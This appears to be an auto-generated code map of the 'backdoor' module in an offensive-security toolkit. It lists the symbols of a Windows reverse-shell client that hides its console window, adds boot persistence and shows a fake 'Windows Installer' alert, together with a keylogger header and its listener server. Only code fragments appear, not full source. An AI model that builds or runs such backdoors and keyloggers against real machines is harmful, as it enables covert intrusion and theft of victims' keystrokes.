# Subsystem: backdoor

## modules/backdoor/backdoor.c
- Layer: utility
- Doc: include <stdio.h> include <stdlib.h> include <unistd.h> include <winsock2.h> include <windows.h> include <winuser.h> inc
- Language: c
- Symbols:
  - `bootRun` (function, line 17) `int bootRun()`
  - `str_cut` (function, line 47) `char *
str_cut(char str[], int slice_from, int slice_to)`
  - `Shell` (function, line 83) `void Shell()`
  - `WinMain` (function, line 124) `int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrev, LPSTR lpCmdLine, int nCmdShow)`
  - `send` (function, line 27) `send(sock, err, sizeof(err), 0);`
  - `RegCloseKey` (function, line 39) `RegCloseKey(NewVal);`
  - `strncpy` (function, line 80) `strncpy(buffer, str, buffer_len);`
  - `bzero` (function, line 90) `jump: bzero(buffer, 1024);`
  - `recv` (function, line 94) `recv(sock, buffer, 1024, 0);`
  - `closesocket` (function, line 97) `closesocket(sock);`
  - `WSACleanup` (function, line 98) `WSACleanup();`
  - `exit` (function, line 99) `exit(0);`
  - `chdir` (function, line 102) `chdir(str_cut(buffer, 3, 100));`
  - `strcat` (function, line 115) `strcat(total_response, container);`
  - `fclose` (function, line 118) `fclose(fp);`
  - `AllocConsole` (function, line 128) `AllocConsole();`
  - `ShowWindow` (function, line 130) `ShowWindow(stealth, 0);`
  - `memset` (function, line 146) `memset(&ServAddr, 0, sizeof(ServAddr));`
  - `Sleep` (function, line 155) `Sleep(10);`
  - `MessageBox` (function, line 158) `MessageBox(NULL, TEXT("Your Device Has Been Hacked!!!"), TEXT("Windows Installer"), MB_OK | MB_ICONERROR);`
  - `bzero` (macro, line 13) `#define bzero(p, size)`
- Depends on: `modules/backdoor/keylogger.h`

## modules/backdoor/keylogger.h
- Layer: infrastructure
- Language: h
- Symbols:
  - `logg` (function, line 1) `DWORD WINAPI logg(LPVOID lpParam)`
  - `Sleep` (function, line 22) `Sleep(10);`
  - `putc` (function, line 96) `putc(showKey,kh);`
  - `fclose` (function, line 97) `fclose(kh);`
- Imported by: `modules/backdoor/backdoor.c`

## modules/backdoor/server.c
- Layer: utility
- Doc: include <stdio.h> include <sys/types.h> include <sys/socket.h> include <netinet/in.h> include <stdlib.h> include <string
- Language: c
- Symbols:
  - `main` (function, line 9) `int main()`
  - `printf` (function, line 22) `printf("Error Setting TCP Socket Options!\n");`
  - `bzero` (function, line 54) `jump: bzero(&buffer, sizeof(buffer));`
  - `fgets` (function, line 58) `fgets(buffer, sizeof(buffer), stdin);`
  - `strtok` (function, line 59) `strtok(buffer, "\n");`
  - `write` (function, line 60) `write(client_socket, buffer, sizeof(buffer));`
  - `recv` (function, line 71) `recv(client_socket, response, sizeof(response), 0);`
  - `close` (function, line 80) `close(client_socket);`
- Imported by: `cli/commands/dns_exfil.py`, `cli/commands/phishing_wizard.py`, `lazyc2.py`, `modules/lazyown_bprfuzzer.py`, `modules/legacy/lazygalazy.py`, `modules/legacy/lazyhttpreverseshell.py`, `skills/hermes-lazyown/mcp_server.py`, `skills/lazyown_mcp.py`, `skills/lazyown_mcp_opencode.py`, `utils.py`
